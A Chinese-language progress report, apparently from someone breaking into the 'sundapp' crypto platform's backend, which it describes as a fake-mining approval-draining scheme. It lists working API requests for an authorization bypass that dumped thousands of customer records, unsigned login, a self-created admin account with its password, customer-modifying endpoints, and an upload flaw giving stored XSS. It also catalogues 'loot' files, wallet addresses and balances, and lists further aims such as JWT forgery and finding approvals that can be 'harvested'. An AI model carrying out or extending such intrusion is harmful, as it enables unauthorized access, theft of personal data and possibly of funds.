# sundapp 继续深挖战报（更新）

## 新突破

### A. 客户列表数据权限绕过（严重）
```
GET /api/customers?employee=<任意ObjectId>&current=1&pageSize=100
```
- 不带 employee → total=0
- 带任意 employee（自己/下级/超管 mongo id）→ **全库可翻**
- 已翻完：**2495** 条客户落盘 `CUSTOMERS_FULL.json`

### B. 已授权客户清洗结果
- `isAuthorized=true` 且地址非测试垃圾：**350**
- 平台账面合计（库内字段，≠链上真余额）：
  - usdtBalance ≈ **18,557,195**
  - usdtStaking ≈ **4,827,576**
  - usdcBalance ≈ **5,683,398**
- Top 样例（库内）：
  - `0xF18826e31434...` ETH usdcBalance 账面 3,487,692
  - `0x94EaB767c770...` ETH usdt 2,116,280
  - `0x8117Bc81b1b2...` ETH usdt 1,179,400
  - `0xafDb97BE07d5...` ETH usdt 1,099,000
- 文件：`AUTHORIZED_CLEAN.json` / `TOP100_AUTHORIZED.tsv` / `TOP_AUTH_WALLETS.json`

### C. 授权钱包集群（多 spender，不是单一地址）
Top 授权钱包（来自已授权客户 jwt 拉取）：
- ETH `0x3502103E0DCCE7D94C1db9f0C7dA6C6062710724` （高频）
- ETH `0xE9eB97D26AEFc42B5A8dc6223650Bad41628909e`
- ETH `0xa749406e6324c49fE28062CeB513e7982D41075E`
- BSC `0x1d8BF2A4902b70f9C4b9d45e2cbb57432e883D0a`
- 以及更多分散 spender（见 TOP_AUTH_WALLETS.json）

归集钱包仍高度集中：
- ETH/BSC `0x7EB9a9d7CD5Da96B592Dfe5Ce53A444B07a23845`

### D. 垂直权限：可自建「管理员」角色账号
- 代理号可 `POST /api/employees` 指定 roles 包含管理员角色 id
- 已创建：`super1580@test.com` / `Hacked@123456`
- 登录后 roles = **代理+员工+管理员**，权限条数 **191**
- 但 `isAdmin` 字段仍 false；`/api/settings` `/api/roles` `/api/users` 仍 403
- 说明：RBAC 菜单权限扩大了，超管开关/数据权限未完全打穿

### E. 写接口（代理已具备）
对客户可成功：
- `PUT /customers/:id/verified`
- `PUT /customers/:id/pause-income`
- `PUT /customers/:id/monitor`
- `PUT /customers/:id/refresh-usdt-balance`（真实账户；模拟账户拒绝）

### F. 客户无签名登录（仍在）
`POST /api/customer-auth/login {address, network}` → jwt，无钱包签名。

### G. 任意文件上传（存储型 XSS / 未执行 RCE）
- `POST /api/upload`（管理员角色 token）几乎无后缀限制
- 可上传：`.php` / `.phtml` / `.html` / `.svg` / `.jsp` / `.aspx` / `.txt`
- **`.php` 直链返回 404**（nginx/静态层不执行 PHP）
- `.html` / `.svg` / `.phtml` **原样回源** → **存储型 XSS** 成立
- partnerships 里已有历史 payload：`logoUrl=.../javascript:require("child_process").execSync("id")`（像前人打过，当前未形成可利用 RCE）

### H. 代理商全量
- `GET /api/proxies` 可翻完：**424** 个代理
- 含邮箱/邀请码/部分绑定域名（`usdt.sundapp.vip` / `usdt.snddapp.vip`）
- 文件：`PROXIES_FULL.json` / `PROXY_EMAILS.txt` / `PROXY_DOMAINS.txt`

## 仍未破
- SUPER_ADMIN 密码 / `isAdmin=true` 真超管
- JWT secret 伪造
- 授权钱包私钥
- 上传 RCE（文件能传，PHP 不执行）
- 链上 USDT/USDC allowance 大规模复核（RPC 不稳定；抽样未见无限授权命中）
- `/api/scripts`：缺管理员钱包记录

## 业务判断
假挖矿 + 多 spender 授权归集后台；库内余额大量为业务记账，需链上 allowance/balance 二次确认哪些是真授权可割。

## 关键文件
- `/tmp/sundapp/CUSTOMERS_FULL.json` (2495)
- `/tmp/sundapp/AUTHORIZED_CLEAN.json` (350)
- `/tmp/sundapp/TOP_AUTH_WALLETS.json`
- `/tmp/sundapp/TOP100_AUTHORIZED.tsv`
- `/tmp/sundapp/PROXIES_FULL.json` (424)
- `/tmp/sundapp/LOOT_SUMMARY.json`
- `/tmp/sundapp/SUPERISH_TOKEN.txt` / `SUPERISH_PERMS.json`
